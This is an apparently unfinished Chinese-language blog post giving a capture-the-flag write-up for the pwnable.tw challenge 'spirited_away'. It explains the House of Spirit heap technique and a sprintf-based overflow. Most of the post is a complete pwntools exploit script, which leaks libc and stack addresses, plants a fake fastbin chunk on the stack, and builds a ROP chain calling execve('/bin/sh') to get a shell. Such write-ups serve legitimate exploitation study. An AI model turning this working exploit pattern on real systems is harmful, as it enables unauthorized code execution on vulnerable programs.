---
title: House of Spirit
date: 2019-03-02 19:35:06
tags: notfinished 
layout: post
---
house of sprit:sprited away
<!--more-->

# 0x00
应该spirit 来源于这里
https://pwnable.tw/challenge/#22

spirited away

# analysis
主要的功能是写影评.

```python
➜  spirited_away checksec spirited_away 
[*] '/home/n132/Desktop/spirited_away/spirited_away'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

程序比较简单输入名字输入为啥看这部电影 感受如何.

# 漏洞点
主要的漏洞点也比较常规.
`sprintf(&v1, "%d comment so far. We will review them as soon as we can", cnt);`
```
char v1; // [esp+10h] [ebp-E8h]
size_t nbytes; // [esp+48h] [ebp-B0h]
```
这里只要cnt长度>`(0x38-54)=3`
v1可以溢出覆盖到nbyte
原本nbyte=0x3c
会被覆盖成`n`也就是`0x6e`

然后就可以溢出到其他地方.
主要是通过这题讲讲一个比较常见的House of 系列
# House of spirite
我的浅薄地认为House of spirite 是利用已有可控的区域，将其伪造成chunk的head & next chunk 的head，然后利用fastbin atk或者其他技巧扩大已有可控区域.
如图
```python
0x0804a010:
------------------
|xxxxxxx|    0x21|<==可控区域
------------------
|xxxxxxxxxxxxxxxx|<==x为不可控区域
------------------
|xxxxxxx|    0x21|<==可控区域
------------------


fastbin:

[0x20] fastbin[2]:-->0x804b000-->0
```
我门通过某些手段做fastbin atk 改写0x804b010 为 0x0804a010那么

```
0x0804a010:
------------------
|xxxxxxx|    0x21|<==可控区域
------------------
|xxxxxxxxxxxxxxxx|<==x为不可控区域
------------------
|xxxxxxx|    0x21|<==可控区域
------------------


fastbin:

[0x20] fastbin[2]:-->0x804b000-->0x0804a010
```
这样我们malloc 两次就可以控制原本不可控区域.

# 思路
例如此题中我们可以控制的区域大多在栈上
溢出之后找一个stack 地址将其输出.
我们可以用comment在栈上完成fakechunk
然后通过溢出做fast bin atk 控制栈.
做rop getshell

# exp
```python
from pwn import *
def sname(name):
	p.readuntil("Please enter your name: ")
	p.send(name)
def sage(age):
	p.sendlineafter("Please enter your age: ",str(age))
def sr(reason):
	p.sendafter("Why did you came to see this movie? ",reason)
def sc(comment):
	p.sendlineafter("Please enter your comment: ",comment)
def raw(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
def sall(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
def sall_10(reason='nier',name='nier',age=1,comment="nier"):

	sage(age)
	sr(reason)

	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
p=process("./spirited_away")
#p=remote("chall.pwnable.tw",10204)
#context.log_level='debug'
libc=ELF("spirited_away").libc
raw("A"*0x18)
p.readuntil("A"*0x18)
libc.address = u32(p.recv(4))-libc.sym['_IO_file_sync']-7
p.recvuntil("comment? <y/n>: ")
p.send("y")
base=libc.address
raw("A"*56)
p.readuntil('A'*56)
stack=u32(p.read(4))
p.sendlineafter("<y/n>: ","y")

log.warning(hex(base))
log.warning(hex(stack))
for x in range(8):
	sall()
for x in range(90):
	sall_10()
for x in range(4):
	sall()
sname("yy")
sage(1)
sr(p32(0x41)*20)
sc("A"*0x50+p32(1)+p32(0xffffcff8-0xffffd048+stack-0x18))
p.sendlineafter("<y/n>: ","y")
libc.address=base
sname("/bin/sh".ljust(4*18,'\x00')+p32(0xdeadbeef)+p32(libc.symbols['execve'])+p32(0xdeadbeef)+p32(0xffffcff8-0xffffd048+stack-0x18)+p32(0)+p32(0))
sage(1)
sr("no")
sc("no")
p.sendlineafter("<y/n>: ","n")
#p.sendline("cat /home/spirited_away/flag")
p.interactive("nier>>")
```



[1]: https://github.com/B3t4M3Ee/banana/tree/master/Pwn/heap_trick/house%20of%20X/house%20of%20spirite